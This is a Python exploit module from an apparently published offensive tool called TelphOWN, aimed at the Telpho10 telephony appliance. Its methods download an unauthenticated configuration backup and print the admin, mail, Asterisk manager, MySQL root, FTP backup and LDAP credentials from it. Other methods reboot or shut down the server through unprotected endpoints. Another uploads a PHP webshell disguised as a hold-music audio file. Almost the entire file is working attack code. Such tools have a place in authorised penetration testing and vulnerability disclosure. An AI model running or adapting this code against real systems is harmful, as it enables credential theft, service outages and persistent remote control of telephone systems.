#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#-------------------------------------------------------------------------------
# TelphOWN - Telpho10 Ownage Tool
# Copyright (c) 2016 Jan Rude
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see [http://www.gnu.org/licenses/](http://www.gnu.org/licenses/)
#-------------------------------------------------------------------------------

import re
import os
import time
import tarfile
from lib.request import Request
from requests_toolbelt.multipart.encoder import MultipartEncoder

class Exploits:
	"""
	Here you can find the exploits:
		dump_credentials:		Generates a configuration backup of Telpho10, downloads the file and dumps the credentials
		reboot_server:			This will reboot the system
		shutdown_server:		This will shutdown the server
		restart_Apache:			If you need to restart Apache
		upload_webshell:		Uploads a specified webshell to /var/www/
	"""

	def __init__(self, ip, creds, webshell):
		self.__ip = ip
		self.__username = creds.split(':')[0]
		self.__password = creds.split(':')[1]
		self.__webshell = webshell

	def dump_credentials(self):
		print('\n[+] Generating backup...')
		backup = Request.get_request(self.__ip + '/telpho/system/backup.php')
		if not backup:
			exit(-1)
		
		response = Request.urlretrieve(self.__ip + '/telpho/temp/telpho10.epb', 'telpho10.epb')

		# extract backup
		tar = tarfile.open('telpho10.epb')
		tar.extract("mysql.tar")
		tar.close()
		#extract mysql backup
		tar = tarfile.open("mysql.tar")
		tar.extractall()
		tar.close()

		config = []
		extract_me = {	'adminusername':'',
						'adminpassword':'',
			    		'ipsmarthost':'',
			    		'mailusername':'',
			    		'mailpassword':'',
			    		'mailfrom':'',
			    		'managersecret':'',
			    		'manageruser':'',
			    		'dbpassword':'',
			    		'ftpbackuppw':'',
			    		'ftpbackupid':'',
						'ldappassword':''}

		print('\n[+] Dumping Credentials...')
		with open("mysql.epb") as mysql_file:
			for line in mysql_file:
				if "adminusername" in line:
					config = line
					break

		for item in extract_me:
			try:
				regex = re.compile(item + '\',\'(.*?)\',\'*')
				search = regex.search(str(config))
				extract_me.update({item:search.groups()[0]})
			except Exception as e:
				print(e)

		print('\n\n[+] Login (/telpho/login.php)')
		print('-----------------------------')
		print(" | Username: " + extract_me['adminusername'])
		print(" | Password: " + extract_me['adminpassword'])

		# also for https://<ip>:10000 (webmin) ?

		print('\n\n[+] Mail configuration')
		print('----------------------')
		print(" | Mailserver: " + extract_me['ipsmarthost'])
		print(" | Username:   " + extract_me['mailusername'])
		print(" | Password:   " + extract_me['mailpassword'])
		print(" | Mail from:  " + extract_me['mailfrom'])

		print('\n\n[+] Asterisk MI (port 5038)')
		print('---------------------------')
		print(" | Username: " + extract_me['manageruser'])
		print(" | Password: " + extract_me['managersecret'])

		print('\n\n[+] MySQL (/phpmyadmin)')
		print('-----------------------')
		print(" | Username: root")
		print(" | Password: " + extract_me['dbpassword'])

		print('\n\n[+] Online Backup')
		print('-----------------')
		print(" | ID:  " + extract_me['ftpbackupid'])
		print(" | Password:  " + extract_me['ftpbackuppw'])

		print('\n\n[+] LDAP (/phpldapadmin)')	
		print('------------------------')
		print(" | Username: " + 'cn=admin,dc=localdomain')
		print(" | Password: " + extract_me['ldappassword'])

		#remove files
		os.remove('telpho10.epb')
		os.remove('mysql.tar')
		os.remove('mysql.epb')

	def reboot_server(self):
		print('\n[+] Requesting Server Reboot...')
		Request.urlopen('/telpho/system/reboot.php')
		self.check_server()
		print('\n[+] Reboot can take up to 1 minute.')

	def shutdown_server(self):
		print('\n[+] Requesting Server Shutdown...')
		Request.urlopen('/telpho/system/shutdown.php')
		self.check_server()

	def restart_Apache(self):
		print('\n[+] Requesting Apache Restart')
		response = Request.urlopen('/telpho/system/restartapache.php')
		if response:
			print('[+] Done')
		else:
			print(e)

	def upload_webshell(self):
		url = self.__ip + '/telpho/holdonmusic.php'
		response = Request.authenticate(self.__ip, self.__username, self.__password)
		try:
			regex = re.compile('(.*?)action="login.php"')
			search = regex.search(response[0])
			search.groups()[0]
			print('[-] Error!\n' + ' '.ljust(4) +'Seems like the provided credentials are incorrect')
		except:			
			print('[+] Uploading Webshell...')
			multipart_data = MultipartEncoder(
			    fields={
			            'action': 'upload', 
			            'id_update': '1',
			            'musicfile':('shell.php', open(self.__webshell, 'rb'), 'audio/mpeg')
			           }
			    )
			response = Request.post_request(url, response[1], multipart_data)
			if '200' in str(response):
				print('[+] Success!\n' + ' '.ljust(4) +'Shell is accessible at:', self.__ip + '/telpho/moh/shell.php')
			else:
				print('[-] Error!\n' + ' '.ljust(4) +'Got', response)


	def check_server(self):
		print('[|] Waiting 10 seconds...')
		time.sleep(10)
		print('\n[+] Checking if server is down...')
		response = Request.get_request(self.__ip + '/telpho/index.php')
		if '503' in response:
			print('[|] Server seems down.\n' + ' '.ljust(4) +'Exploit succeeded!')
		else:
			print('[|] Server is still online.\n' + ' '.ljust(4) +'Exploit failed!')
